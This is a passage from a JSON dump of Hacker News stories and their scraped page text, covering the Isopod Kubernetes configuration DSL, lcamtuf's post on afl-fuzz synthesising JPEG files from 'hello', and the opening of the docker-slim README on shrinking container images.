          "Isopod is notable for allowing the fetching of remote data that can then be used to configure the kubernetes objects. Terraform and pulumi are the only other ones that allow this. Bad about isopod is that the tool does not appear to automatically delete resources in the cluster after they are deleted from the code, and instead, a delete function must be called manually. That is a conceptual weakness compared to terraform and pulumi, and also a weakness compared to `kubectl apply --prune`."
        ],
        "id": "36357efa-3059-4a61-8cf3-3825287d9b62",
        "url_text": "Isopod Isopod is an expressive DSL framework for Kubernetes configuration. Without intermediate YAML artifacts, Isopod renders Kubernetes objects as Protocol Buffers, so they are strongly typed and consumed directly by the Kubernetes API. With Isopod, configurations are scripted in Starlark, a Python dialect by Google also used by Bazel and Buck build systems. Isopod offers runtime built-ins to access services and utilities such as Vault secret management, Kubernetes apiserver, HTTP requester, Base64 encoder, and UUID generator, etc. Isopod uses separate runtime for unit tests to mock all built-ins, providing the test coverage not possible before. A 5-min read, this medium post explains the inefficiency of existing YAML templating tools when dealing with values not statically known and complicated control logics such as loops and branches. It also gives simple code examples to show why Isopod is an expressive, hermetic, and extensible solution to configuration management in Kubernetes. Isopod Build Main Entryfile Clusters gke() onprem() Addons Generate Addons Load Remote Isopod Modules Built-ins kube Methods: kube.put kube.delete kube.put_yaml kube.get kube.exists kube.from_str, kube.from_int Vault Methods: vault.read vault.write vault.exist Helm Methods: helm.apply Misc base64.{encode, decode} uuid.{v3, v4, v5} http.{get, post, patch, put, delete} hash.{sha256, sha1, md5} sleep error Testing Dry Run Produces YAML Diffs Diff filtering License Contributions Build $ go version go version go1.14 darwin/amd64 $ GO111MODULE=on go build Main Entryfile Isopod will call the clusters(ctx) function in the main Starlark file to get a list of target clusters. For each of such clusters, isopod will call addons(ctx) to get a list of addons for configuration rollout. Example: CLUSTERS = [ onprem(env=\"dev\", cluster=\"minikube\", vaultkubeconfig=\"secret/path\"), gke( env=\"prod\", cluster=\"paas-prod\", location=\"us-west1\", project=\"cruise-paas-prod\", use_internal_ip=\"false\", # default to \"false\", which uses public endpoint ), ] def clusters(ctx): if ctx.cluster != None: return [c for c in CLUSTERS if c.cluster == ctx.cluster] elif ctx.env != None: return [c for c in CLUSTERS if c.env == ctx.env] return CLUSTERS def addons(ctx) return [ addon(\"ingress\", \"configs/ingress.ipd\", ctx), ] Clusters The ctx argument to clusters(ctx) comes from the command line flag --context to Isopod. This flag takes a comma-separated list of foo=bar and makes these values available in Starlark as ctx.foo (which gives \"bar\"). Currently Isopod supports the following clusters, and could easily be extended to cover other Kubernetes vendors, such as EKS and AKS. gke() Represents a Google Kubernetes Engine. Authenticates using Google Cloud Service Account Credentials or Google Default Application Credentials. Requires the cluster, location and project fields, while optionally takes use_internal_ip field to connect API server via private endpoint. Additional fields are allowed. onprem() Represents an on-premise or self-managed Kubernetes cluster. Authenticates using the kubeconfig file or Vault path containing the kubeconfig. No fields are required, though setting the vaultkubeconfig field to the path in Vault where the KubeConfig exists is necessary to utilize this auth method. Addons The ctx argument to addons(ctx) contains all fields of the chosen cluster. For example, say the cluster is gke( env=\"prod\", cluster=\"paas-prod\", location=\"us-west1\", project=\"cruise-paas-prod\", use_internal_ip=\"false\", # default to \"false\", which uses public endpoint ), Then, each addon may access the cluster information as ctx.env to get \"prod\" and ctx.location to get \"us-west1\". Accessing nonexistant attribute ctx.foo will get None. Each addon is represented using the addon() Starlark built-in, which takes three arguments, for example addon(\"name\", \"entry_file.ipd\", ctx). The first argument is the addon name, used by the --match_addon feature. The thrid is optional and represents the ctx input to addons(ctx) to make the cluster attributes available to the addon. Each addon must implement install(ctx) and remove(ctx) functions. More advanced examples can be found in the examples folder. Example Nginx addon: appsv1 = proto.package(\"k8s.io.api.apps.v1\") corev1 = proto.package(\"k8s.io.api.core.v1\") metav1 = proto.package(\"k8s.io.apimachinery.pkg.apis.meta.v1\") def install(ctx): metadata = metav1.ObjectMeta( name=\"nginx\", namespace=\"example\", labels={\"app\": \"nginx\"}, ) nginxContainer = corev1.Container( name=metadata.name, image=\"nginx:1.15.5\", ports=[corev1.ContainerPort(containerPort=80)], ), deploySpec = appsv1.DeploymentSpec( replicas=3, selector=metav1.LabelSelector(matchLabels=metadata.labels), template=corev1.PodTemplateSpec( metadata=metadata, spec=corev1.PodSpec( containers=[nginxContainer], ), ), ) kube.put( name=metadata.name, namespace=metadata.namespace, data=[appsv1.Deployment( metadata=metav1.ObjectMeta(name=metadata.name), spec=deploySpec, )], ) Generate Addons You might come from a place where you have a yaml file, but you want to derive an isopod addon from it. It can be cumbersome to re-write huge yaml files in Starlark. So isopod offers a convenience command to generate the Starlark code based on a yaml or json input file containing any kubernetes API object: isopod generate runtime/testdata/clusterrolebinding.yaml > addon.ipd For now all k8s.io resources are supported. Load Remote Isopod Modules Similar to Bazel's WORKSPACE file, the isopod.deps file allows you to define remote and versioned git modules to import to local modules. For example, git_repository( name=\"isopod_tools\", commit=\"dbe211be57bc27b947ab3e64568ecc94c23a9439\", remote=\"https://github.com/cruise-automation/isopod.git\", ) To import remote modules, use load(\"@target_name//path/to/file\", \"foo\", \"bar\"), for example, load(\"@isopod_tools//examples/helpers.ipd\", \"health_probe\", \"env_from_field\", \"container_port\") ... spec=corev1.PodSpec( containers=[corev1.Container( name=\"nginx-ingress-controller\", image=\"quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.22.0\", env=[ env_from_field(\"POD_NAME\", \"metadata.name\"), env_from_field(\"POD_NAMESPACE\", \"metadata.namespace\"), ], livenessProbe=health_probe(10254), readinessProbe=health_probe(10254), ports=[ container_port(\"http\", 80), container_port(\"https\", 443), container_port(\"metrics\", 10254), ], )], ) To import remote addon files, use addon(\"addon_name\", \"\"@addon_name//path/to/file\", ctx), for example, isopod.deps: git_repository( name=\"versioned_addon\", commit=\"1.0.0\", remote=\"https://github.com/cruise-automation/addon.git\", ) ... main.ipd: def addons(ctx): if ctx.cluster == None: error(\"`ctx.cluster' not set\") if ctx.foobar != None: error(\"`ctx.foobar' must be `None', got: {foobar}\".format( foobar=ctx.foobar)) return [ addon(\"addon_name\", \"@addon_name//addon/addon.ipd\", ctx), ] By default Isopod uses $(pwd)/isopod.deps, which you can override with --deps flag. Built-ins Built-ins are pre-declared packages available in Isopod runtime. Typically they perform I/O to Kubernetes, Vault, GCP and other resources but could be used for break-outs into other operations not supported by the main Starlark interpreter. Currently these build-ins are supported: kube Built-in for managing Kubernetes objects. Methods: kube.put Updates (creates if it doesn't already exist) object in Kubernetes. kube.put( name = \"nginx-role\", namespace = \"nginx-ingress\", # Optional Kubernetes API Group parameter. If not set, will attempt to # deduce the group from message type but since Kubernetes API Group names # are highly irregular, this may fail. api_group = 'rbac.authorization.kubernetes.io', data = [ rbacv1.Role(), ], ) Supported args: name - Name (.metadata.name) of the resource namespace (Optional) - Namespace (.metadata.namespace) of the resource api_group (Optional) - API group of the resource. If not provided, Isopod runtime will attempt to deduce the resource from just Proto type name which is unreliable. It is recommended to set this for all objects outside of core group. Optionally, version can also be specified after a /, example: apiextensions.k8s.io - specify the group only, version is implied from Proto or from runtime. apiextensions.k8s.io/v1 - specify both group and version. subresource (Optional) - A subresource specifier (e.g /status). data - A list of Protobuf definitions of objects to be created. kube.delete Deletes object in Kubernetes. # kwarg key is resource name, value is <namespace>/<name> (just <name> for # non-namespaced resources). kube.delete(deployment=\"default/nginx\") # api_group can optionally be provided to remove ambuguity (if multiple # resources by the same name exist in different API Groups or different versions). kube.delete(clusterrole=\"nginx\", api_group = \"rbac.authorization.k8s.io/v1\") kube.put_yaml Same as put but for YAML/JSON data. To be used for CRDs and other custom types. kube.put usage is preferred for the standard set of Kubernetes types. ark_config = \"\"\" apiVersion: ark.heptio.com/v1 kind: Config metadata:\" namespace: ark-backup name: default backupStorageProvider: name: gcp bucket: test-ark-backup persistentVolumeProvider: name: gcp \"\"\" kube.put_yaml( name = \"ark-config\", namespace = \"backup\", data = [ark_config]) # Alternatively render from native Starlark struct object via JSON: ark_config = struct( apiVersion = \"ark.heptio.com/v1\", kind = \"Config\", metadata = struct( name = \"ark-backup\", namespace = \"default\", ), backupStorageProvider = struct( name = \"gcp\", bucket = \"test-ark-backup\", ), persistentVolumeProvider = struct( name = \"gcp\", ), ) kube.put_yaml( name = \"ark-config\", namespace = \"backup\", data = [ark_config.to_json()]) kube.get Reads object from API Server. If wait argument is set to duration (e.g 10s) will block until the object is successfully read or timer expires. If json=True optional argument is provided, will render object as unstructured JSON represented as Starlark dict at top level. This is useful for CRDs as they typically do not support Protobuf representation. # Wait 60s for Service Account token secret. secret = kube.get(secret=namespace+\"/\"+serviceaccount.secrets[0].name, wait=\"60s\") # Get ClusterRbacSyncConfig CRD. cadmin = kube.get(clusterrbacsyncconfig=\"cluster-admin\", api_group=\"rbacsync.getcruise.com\", json=True) It is also possible to receive a list of kubernetes objects. They can be filtered as defined in the API documentation. # Get all pods in namespace kube-system. pods = kube.get(pod=\"kube-system/\") # Get all pods with label component=kube-apiserver pods = kube.get(pod=\"kube-system/?labelSelector=component=kube-apiserver\") kube.exists Checks whether a resource exists. If wait argument is set to duration (e.g 10s) will block until the object is successfully read or timer expires. # Assert that the resource doesn't exist. e = kube.exists(secret=namespace+\"/\"+serviceaccount.secrets[0].name, wait=\"10s\") assert(e != True, \"Fail: resource shouldn't exist\") kube.from_str, kube.from_int Convert Starlark string and int types to corresponding *instr.IntOrString protos. appsv1.RollingUpdateDaemonSet( maxUnavailable = kube.from_str(\"10%\"), ) Vault Vault break-out allows reading/writing values from Enterprise Vault. Methods: vault.read Reads data from Vault path as Starlark dict vault.write Writes kwargs to Vault path vault.exist Checks if path exists in Vault Example usage: if not vault.exist(\"secret/lidar/stuff\"): vault.write(\"secret/lidar/stuff\", w1=\"hello\", w2=\"world!\") data = vault.read(\"secret/infra/myapp\") print(data[\"w1\"] + \" \" + data[\"w2\"]) Helm Helm built-in renders Helm charts and applies the resource manifest changes. Methods: helm.apply Applies resource changes. globalValues = \"\"\" global: priorityClassName: \"cluster-critical\" \"\"\" pilotValues = \"\"\" pilot: replicaCount: 3 image: docker.io/istio/pilot:v1.2.3 traceSampling: 50.0 \"\"\" pilotOverlayValues = { \"pilot\": { \"traceSampling\": 100.0, } } helm.apply( release_name = \"istio-pilot\", chart = \"//charts/istio/istio-pilot\", namespace = \"istio-system\", values = [ yaml.unmarshal(globalValues), yaml.unmarshal(pilotValues), pilotOverlayValues ] ) Supported args: release_name - Release Name for the Helm chart. chart - Source Path of the chart. This can be a full path or a path relative to the working directory. Having a leading double-slash (//) will make it relative path. namespace (Optional) - Namespace (.metadata.namespace) of the resources values (Optional) - A list of Starlark Values used as input values for the charts. The ordering of a list matters, and the elements get overridden by the trailing values. Misc Various other utilities are available as Starlark built-ins for convenience: base64.{encode, decode} Translate string values to/from base64 uuid.{v3, v4, v5} Produce corresponding flavor of UUID values http.{get, post, patch, put, delete} Sends corresponding HTTP request to specified url. Returns response body as string, if present. Errors out on non-2XX response code. Will follow redirects (stops after 10 consecutive requests). Arguments: url - URL to send request to (required). headers - optional header dict (values are either string for single-value headers or list for multiple-value headers). data - optionally send data in the body of the request (takes string). hash.{sha256, sha1, md5} Returns an integer hash value. Useful applied to an env var for forcing a redeploy when a config or secret changes. sleep Pauses execution for specified duration (requires Go duration string). error Interrupts execution and return error to the user (requires string error message). Testing isopod test command allows addon creators to write hermetic unit tests on their addons. Unit tests must be contained inside files with a _test.ipd suffix and Isopod runtime will call every top-level method defined in that file as a separate test, execute it and report the result. Built-in modules that allow external access (like kube and vault) are stubbed (faked) out in unit test mode so that tests are hermetic. Intended pattern is to import the addon config files from the test, then call their methods and test the results with assert built-in (only supported in test mode). Example test: # Load ingress addon config and expose its \"install\" method. load(\"testdata/ingress.ipd\", \"install\") def test_install(t): # Test setup code. vault.write(\"secret/car/cert\", crt=\"foobar\") t.ctx.namespace = \"foobar\" # Call method we are testing (creates namespace from context). install(t.ctx) # Now extract data from our fake \"kube\" module and verify our tests # conditions. ns = kube.get(namespace=\"foobar\") assert(ns.metadata.name == \"foobar\", \"fail\") assert(ns.metadata.labels[\"foo\"] == \"bar\", \"fail\") The test command is designed to mimic standard go test. As such you can execute all test in subtree by running isopod test path/..., all test in a directory by running isopod test path/ and all tests from a current working subtree by running just isopod test. Dry Run Produces YAML Diffs Knowledge regarding the intended actions of any specification change is crucial for migration and everyday configuration updates. It prevents accidental removal of the critical fields that is otherwise uncatchable with just the new set of configurations. In dry run mode, Isopod not only verifies the legitimacy of the Starlark scripts but also informs the intended actions of the configuration change, by presenting the YAML diff between live objects in cluster and the generated configurations call \"head\". The result looks like the following. *** service.v1 example/nginx *** --- live +++ head @@ -14,8 +14,9 @@ port: 80 targetPort: 80 selector: app: nginx clusterIP: 192.168.17.77 - type: ClusterIP + type: NodePort sessionAffinity: None + externalTrafficPolicy: Cluster Diff filtering Many fields are managed by controllers and updated at runtime, which means they don't match the initially specified resource definition. In order to reduce noise when evaluating whether a dry-run is safe to apply, some filtering is performed on the current and requested resource definitions. By default, Isopod attempts to apply schema defaults and filter fields that are set by built-in kubernetes controllers at runtime. In addition to the default filters, Isopod users may specify filters in two ways, individually using --kube_diff_filter or in bulk with --kube_diff_filter_file. Individual Filters Example: $ isopod \\ --vault_token \"${vault_token}\" \\ --context \"cluster=${cluster}\" \\ --dry_run --nospin \\ --kube_diff_filter 'metadata.creationTimestamp' \\ --kube_diff_filter 'metadata.annotations[\"isopod.getcruise.com/context\"]' \\ --kube_diff_filter 'metadata.annotations[\"deployment.kubernetes.io/revision\"]' \\ --kube_diff_filter 'metadata.annotations[\"deprecated.daemonset.template.generation\"]' \\ --kube_diff_filter 'metadata.annotations[\"autoscaling.alpha.kubernetes.io/conditions\"]' \\ --kube_diff_filter 'metadata.annotations[\"cloud.google.com/neg-status\"]' \\ --kube_diff_filter 'metadata.annotations[\"runscope.getcruise.com/api-test-ids\"]' \\ --kube_diff_filter 'spec.template.spec.serviceAccount' \\ --kube_diff_filter 'spec.jobTemplate.spec.template.spec.serviceAccount' \\ install \\ \"${DEFAULT_CONFIG_PATH}\" Bulk Filters Example: $ cat > filters.txt <<EOF metadata.creationTimestamp metadata.annotations[\"isopod.getcruise.com/context\"] metadata.annotations[\"deployment.kubernetes.io/revision\"] metadata.annotations[\"deprecated.daemonset.template.generation\"] metadata.annotations[\"autoscaling.alpha.kubernetes.io/conditions\"] metadata.annotations[\"cloud.google.com/neg-status\"] metadata.annotations[\"runscope.getcruise.com/api-test-ids\"] spec.template.spec.serviceAccount spec.jobTemplate.spec.template.spec.serviceAccount EOF $ isopod \\ --vault_token \"${vault_token}\" \\ --context \"cluster=${cluster}\" \\ --dry_run --nospin \\ --kube_diff_filter_file \"filters.txt\" \\ install \\ \"${DEFAULT_CONFIG_PATH}\" License Copyright 2020 Cruise LLC Licensed under the Apache License Version 2.0 (the \"License\"); you may not use this project except in compliance with the License. Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. Contributions Contributions are welcome! Please see the agreement for contributions in CONTRIBUTING.md. Commits must be made with a Sign-off (git commit -s) certifying that you agree to the provisions in CONTRIBUTING.md. ",
        "_version_": 1718527429838897152
      },
      {
        "story_id": [19470890],
        "story_author": ["rayraegah"],
        "story_descendants": [14],
        "story_score": [177],
        "story_time": ["2019-03-23T15:44:02Z"],
        "story_title": "Pulling JPEGs out of thin air (2014)",
        "search": [
          "Pulling JPEGs out of thin air (2014)",
          "http://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html",
          "This is an interesting demonstration of the capabilities ofafl; I was actually pretty surprised that it worked!$ mkdir in_dir $ echo 'hello' >in_dir/hello $ ./afl-fuzz -i in_dir -o out_dir ./jpeg-9a/djpegIn essence, I created a text file containing just \"hello\" and asked the fuzzer to keep feeding it to a program that expects a JPEG image (djpegis a simple utility bundled with the ubiquitousIJG jpegimage library;libjpeg-turboshould also work). Of course, my input file does not resemble a valid picture, so it gets immediately rejected by the utility:$ ./djpeg '../out_dir/queue/id:000000,orig:hello' Not a JPEG file: starts with 0x68 0x65Such a fuzzing run would be normally completely pointless: there is essentially no chance that a \"hello\" could be ever turned into a valid JPEG by a traditional, format-agnostic fuzzer, since the probability that dozens of random tweaks would align just right is astronomically low.Luckily,afl-fuzzcan leverage lightweight assembly-level instrumentation to its advantage - and within a millisecond or so, it notices that although setting the first byte to0xffdoes not change the externally observable output, it triggers a slightly different internal code path in the tested app. Equipped with this information, it decides to use that test case as a seed for future fuzzing rounds:$ ./djpeg '../out_dir/queue/id:000001,src:000000,op:int8,pos:0,val:-1,+cov' Not a JPEG file: starts with 0xff 0x65When later working with that second-generation test case, the fuzzer almost immediately notices that setting the second byte to0xd8does something even more interesting:$ ./djpeg '../out_dir/queue/id:000004,src:000001,op:havoc,rep:16,+cov' Premature end of JPEG file JPEG datastream contains no imageAt this point, the fuzzer managed to synthesize the valid file header - and actually realized its significance. Using this output as the seed for the next round of fuzzing, it quickly starts getting deeper and deeper into the woods. Within several hundred generations and several hundred millionexecve()calls, it figures out more and more of the essential control structures that make a valid JPEG file - SOFs, Huffman tables, quantization tables, SOS markers, and so on:$ ./djpeg '../out_dir/queue/id:000008,src:000004,op:havoc,rep:2,+cov' Invalid JPEG file structure: two SOI markers ... $ ./djpeg '../out_dir/queue/id:001005,src:000262+000979,op:splice,rep:2' Quantization table 0x0e was not defined ... $ ./djpeg '../out_dir/queue/id:001282,src:001005+001270,op:splice,rep:2,+cov' >.tmp; ls -l .tmp -rw-r--r-- 1 lcamtuf lcamtuf 7069 Nov 7 09:29 .tmpThe first image, hit after about six hours on an 8-core system, looks very unassuming: it's a blank grayscale image, 3 pixels wide and 784 pixels tall. But the moment it is discovered, the fuzzer starts using the image as a seed - rapidly producing a wide array of more interesting pics for every new execution path:Of course, synthesizing a complete image out of thin air is an extreme example, and not necessarily a very practical one. But more prosaically, fuzzers are meant to stress-test every feature of the targeted program. With instrumented, generational fuzzing, lesser-known features (e.g., progressive, black-and-white, or arithmetic-coded JPEGs) can bediscovered and locked ontowithout requiring a giant, high-quality corpus of diverse test cases to seed the fuzzer with.The cool part of thelibjpegdemo is that it works without any special preparation: there is nothing special about the \"hello\" string, the fuzzer knows nothing about image parsing, and is not designed or fine-tuned to work with this particular library. There aren't even any command-line knobs to turn. You can throwafl-fuzzat many other types of parsers with similar results: with bash, it willwrite valid scripts; withgiflib, it will make GIFs; withfileutils, it will create and flag ELF files, Atari 68xxx executables, x86 boot sectors, and UTF-8 with BOM. In almost all cases, the performance impact of instrumentation is minimal, too.Of course, not all is roses; at its core,afl-fuzzis still a brute-force tool. This makes it simple, fast, and robust, but also means that certain types of atomically executed checks with a large search space may pose an insurmountable obstacle to the fuzzer; a good example of this may be:if (strcmp(header.magic_password, \"h4ck3d by p1gZ\")) goto terminate_now;In practical terms, this means thatafl-fuzzwon't have as much luck \"inventing\" PNG files or non-trivial HTML documents from scratch - and will need a starting point better than just \"hello\". To consistently deal with code constructs similar to the one shown above, a general-purpose fuzzer would need to understand the operation of the targeted binary on a wholly different level. There is some progress on this in the academia, but frameworks that can pull this off across diverse and complex codebases in a quick, easy, and reliable way are probably still years away.PS. Several folks asked me about symbolic execution and other inspirations forafl-fuzz; I put together some notes inthis doc. ",
          "Really cool! I recently happened to have a similar idea when I came across the rust-fuzz crate, which abstracts over afl, honggfuzz etc.<p>If you're interested, my notes are here: <a href=\"https://github.com/lachenmayer/insta-fuzz\" rel=\"nofollow\">https://github.com/lachenmayer/insta-fuzz</a><p>I ended up \"cheating\" a little bit by providing a valid JPEG header - I found that rust-fuzz seemed to take far too long to generate any valid JPEG at all by starting from eg. an empty file. But maybe I just wasn't patient enough, after all I was only running it on my laptop :)",
          "I've used this in the past (inspired by this) to produce some valid json.  Of course, a jpeg is at least pretty.  Valid JSON is still just boring old JSON."
        ],
        "story_type": ["Normal"],
        "url": "http://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html",
        "comments.comment_id": [19479183, 19479307],
        "comments.comment_author": ["lachenmayer", "Twirrim"],
        "comments.comment_descendants": [2, 0],
        "comments.comment_time": [
          "2019-03-24T22:40:06Z",
          "2019-03-24T23:14:42Z"
        ],
        "comments.comment_text": [
          "Really cool! I recently happened to have a similar idea when I came across the rust-fuzz crate, which abstracts over afl, honggfuzz etc.<p>If you're interested, my notes are here: <a href=\"https://github.com/lachenmayer/insta-fuzz\" rel=\"nofollow\">https://github.com/lachenmayer/insta-fuzz</a><p>I ended up \"cheating\" a little bit by providing a valid JPEG header - I found that rust-fuzz seemed to take far too long to generate any valid JPEG at all by starting from eg. an empty file. But maybe I just wasn't patient enough, after all I was only running it on my laptop :)",
          "I've used this in the past (inspired by this) to produce some valid json.  Of course, a jpeg is at least pretty.  Valid JSON is still just boring old JSON."
        ],
        "id": "4e7dba98-0706-4dd8-bcae-deb37d9639a2",
        "url_text": "This is an interesting demonstration of the capabilities ofafl; I was actually pretty surprised that it worked!$ mkdir in_dir $ echo 'hello' >in_dir/hello $ ./afl-fuzz -i in_dir -o out_dir ./jpeg-9a/djpegIn essence, I created a text file containing just \"hello\" and asked the fuzzer to keep feeding it to a program that expects a JPEG image (djpegis a simple utility bundled with the ubiquitousIJG jpegimage library;libjpeg-turboshould also work). Of course, my input file does not resemble a valid picture, so it gets immediately rejected by the utility:$ ./djpeg '../out_dir/queue/id:000000,orig:hello' Not a JPEG file: starts with 0x68 0x65Such a fuzzing run would be normally completely pointless: there is essentially no chance that a \"hello\" could be ever turned into a valid JPEG by a traditional, format-agnostic fuzzer, since the probability that dozens of random tweaks would align just right is astronomically low.Luckily,afl-fuzzcan leverage lightweight assembly-level instrumentation to its advantage - and within a millisecond or so, it notices that although setting the first byte to0xffdoes not change the externally observable output, it triggers a slightly different internal code path in the tested app. Equipped with this information, it decides to use that test case as a seed for future fuzzing rounds:$ ./djpeg '../out_dir/queue/id:000001,src:000000,op:int8,pos:0,val:-1,+cov' Not a JPEG file: starts with 0xff 0x65When later working with that second-generation test case, the fuzzer almost immediately notices that setting the second byte to0xd8does something even more interesting:$ ./djpeg '../out_dir/queue/id:000004,src:000001,op:havoc,rep:16,+cov' Premature end of JPEG file JPEG datastream contains no imageAt this point, the fuzzer managed to synthesize the valid file header - and actually realized its significance. Using this output as the seed for the next round of fuzzing, it quickly starts getting deeper and deeper into the woods. Within several hundred generations and several hundred millionexecve()calls, it figures out more and more of the essential control structures that make a valid JPEG file - SOFs, Huffman tables, quantization tables, SOS markers, and so on:$ ./djpeg '../out_dir/queue/id:000008,src:000004,op:havoc,rep:2,+cov' Invalid JPEG file structure: two SOI markers ... $ ./djpeg '../out_dir/queue/id:001005,src:000262+000979,op:splice,rep:2' Quantization table 0x0e was not defined ... $ ./djpeg '../out_dir/queue/id:001282,src:001005+001270,op:splice,rep:2,+cov' >.tmp; ls -l .tmp -rw-r--r-- 1 lcamtuf lcamtuf 7069 Nov 7 09:29 .tmpThe first image, hit after about six hours on an 8-core system, looks very unassuming: it's a blank grayscale image, 3 pixels wide and 784 pixels tall. But the moment it is discovered, the fuzzer starts using the image as a seed - rapidly producing a wide array of more interesting pics for every new execution path:Of course, synthesizing a complete image out of thin air is an extreme example, and not necessarily a very practical one. But more prosaically, fuzzers are meant to stress-test every feature of the targeted program. With instrumented, generational fuzzing, lesser-known features (e.g., progressive, black-and-white, or arithmetic-coded JPEGs) can bediscovered and locked ontowithout requiring a giant, high-quality corpus of diverse test cases to seed the fuzzer with.The cool part of thelibjpegdemo is that it works without any special preparation: there is nothing special about the \"hello\" string, the fuzzer knows nothing about image parsing, and is not designed or fine-tuned to work with this particular library. There aren't even any command-line knobs to turn. You can throwafl-fuzzat many other types of parsers with similar results: with bash, it willwrite valid scripts; withgiflib, it will make GIFs; withfileutils, it will create and flag ELF files, Atari 68xxx executables, x86 boot sectors, and UTF-8 with BOM. In almost all cases, the performance impact of instrumentation is minimal, too.Of course, not all is roses; at its core,afl-fuzzis still a brute-force tool. This makes it simple, fast, and robust, but also means that certain types of atomically executed checks with a large search space may pose an insurmountable obstacle to the fuzzer; a good example of this may be:if (strcmp(header.magic_password, \"h4ck3d by p1gZ\")) goto terminate_now;In practical terms, this means thatafl-fuzzwon't have as much luck \"inventing\" PNG files or non-trivial HTML documents from scratch - and will need a starting point better than just \"hello\". To consistently deal with code constructs similar to the one shown above, a general-purpose fuzzer would need to understand the operation of the targeted binary on a wholly different level. There is some progress on this in the academia, but frameworks that can pull this off across diverse and complex codebases in a quick, easy, and reliable way are probably still years away.PS. Several folks asked me about symbolic execution and other inspirations forafl-fuzz; I put together some notes inthis doc. ",
        "_version_": 1718527395455041536
      },
      {
        "story_id": [21755871],
        "story_author": ["LinuxBender"],
        "story_descendants": [98],
        "story_score": [379],
        "story_time": ["2019-12-10T19:19:47Z"],
        "story_title": "Docker-slim: Minify your Docker container image without changing anything",
        "search": [
          "Docker-slim: Minify your Docker container image without changing anything",
          "https://github.com/docker-slim/docker-slim",
          "Optimize Your Experience with Containers. Make Your Containers Better, Smaller, More Secure and Do Less to Get There (free and open source!) Don't change anything in your Docker container image and minify it by up to 30x making it secure too! Optimizing images isn't the only thing it can do though. It can also help you understand and author better container images. Keep doing what you are doing. No need to change anything. Use the base image you want. Use the package manager you want. Don't worry about hand optimizing your Dockerfile. You shouldn't have to throw away your tools and your workflow to have small container images. Don't worry about manually creating Seccomp and AppArmor security profiles. You shouldn't have to become an expert in Linux syscalls, Seccomp and AppArmor to have secure containers. Even if you do know enough about it wasting time reverse engineering your application behavior can be time-consuming. docker-slim will optimize and secure your containers by understanding your application and what it needs using various analysis techniques. It will throw away what you don't need, reducing the attack surface of your container. What if you need some of those extra things to debug your container? You can use dedicated debugging side-car containers for that (more details below). Understand your container image before and after you optimize it using the xray command in docker-slim or the Slim SaaS where you can get even more powerful insights including how your container image changed. docker-slim has been used with Node.js, Python, Ruby, Java, Golang, Rust, Elixir and PHP (some app types) running on Ubuntu, Debian, CentOS, Alpine and even Distroless. Note that some application stacks do require advanced container probing to make sure that all dynamically loaded components are detected. See the --http-probe* flags for more details to know how you can define custom probe commands. In some cases you might also need to use the --include-path flag to make sure everything your application needs is included (e.g., ubuntu.com python SPA app container image example where the client side template files are explicitly included). It's also a good idea to use your app/environment tests when you run docker-slim. See the --continue-after flag for more details about integrating your tests with the temporary container docker-slim creates when it's doing its dynamic analysis. Running tests in the target container is also an option, but it does require you to specify a custom ENTRYPOINT/CMD with a custom wrapper to start your app and to execute your tests. Interactive CLI prompt screencast: Watch this screencast to see how an application image is minified by more than 30x. When docker-slim runs it gives you an opportunity to interact with the temporary container it creates. By default, it will pause and wait for your input before it continues its execution. You can change this behavior using the --continue-after flag. If your application exposes any web interfaces (e.g., when you have a web server or an HTTP API), you'll see the port numbers on the host machine you will need to use to interact with your application (look for the port.list and target.port.info messages on the screen). For example, in the screencast above you'll see that the internal application port 8000 is mapped to port 32911 on your host. Note that docker-slim will interact with your application for you when HTTP probing is enabled (enabled by default; see the --http-probe* flag docs for more details). Some web applications built with scripting languages like Python or Ruby require service interactions to load everything in the application. Enable HTTP probing unless it gets in your way. You can also interact with the temporary container via a shell script or snippet using --exec-file or --exec. For example, you can create a container which is only capable of using curl. >> docker pull archlinux:latest ... >> docker-slim build --target archlinux:latest --tag archlinux:curl --http-probe=false --exec \"curl checkip.amazonaws.com\" ... >> docker run archlinux:curl curl checkip.amazonaws.com ... >> docker images archlinux curl ... ... 17.4MB archlinux latest ... ... 467MB ... Community Feel free to join any of these channels or just open a new Github issue if you want to chat or if you need help. YouTube channel Gitter channel Discord server Discussions (new) Twitter Slack Original IRC channel on freenode (not used anymore, but we can start using it again :-): #dockerslim DockerSlim on the Internet Books: Everyone's Docker/Kubernetes (Japanese) Docker in Practice (2nd edition) Docker/Kubernetes Security Practice Guide (Japanese) Minification Examples You can find the examples in a separate repository: https://github.com/docker-slim/examples Node.js application images: from ubuntu:14.04 - 432MB => 14MB (minified by 30.85X) from debian:jessie - 406MB => 25.1MB (minified by 16.21X) from node:alpine - 66.7MB => 34.7MB (minified by 1.92X) from node:distroless - 72.7MB => 39.7MB (minified by 1.83X) Python application images: from ubuntu:14.04 - 438MB => 16.8MB (minified by 25.99X) from python:2.7-alpine - 84.3MB => 23.1MB (minified by 3.65X) from python:2.7.15 - 916MB => 27.5MB (minified by 33.29X) from centos:7 - 647MB => 23MB (minified by 28.57X) from centos/python-27-centos7 - 700MB => 24MB (minified by 29.01X) from python2.7:distroless - 60.7MB => 18.3MB (minified by 3.32X) Ruby application images: from ubuntu:14.04 - 433MB => 13.8MB (minified by 31.31X) from ruby:2.2-alpine - 319MB => 27MB (minified by 11.88X) from ruby:2.5.3 - 978MB => 30MB (minified by 32.74X) Golang application images: from golang:latest - 700MB => 1.56MB (minified by 448.76X) from ubuntu:14.04 - 531MB => 1.87MB (minified by 284.10X) from golang:alpine - 258MB => 1.56MB (minified by 165.61X) from centos:7 - 615MB => 1.87MB (minified by 329.14X) Rust application images: from rust:1.31 - 2GB => 14MB (minified by 147.16X) JAVA application images: from ubuntu:14.04 - 743.6 MB => 100.3 MB PHP application images: from php:7.0-cli - 368MB => 26.6MB (minified by 13.85X) Haskell application images: (Scotty service) from haskell:8 - 2.09GB => 16.6MB (minified by 125.32X) (Scotty service) from haskell:7 - 1.5GB => 21MB (minified by 71X) Elixir application images: (Phoenix service) from elixir:1.6 - 1.1 GB => 37 MB (minified by 29.25X) RECENT UPDATES INSTALLATION BASIC USAGE INFO COMMANDS USAGE DETAILS LINT COMMAND OPTIONS XRAY COMMAND OPTIONS BUILD COMMAND OPTIONS RUNNING CONTAINERIZED DOCKER CONNECT OPTIONS HTTP PROBE COMMANDS DEBUGGING MINIFIED 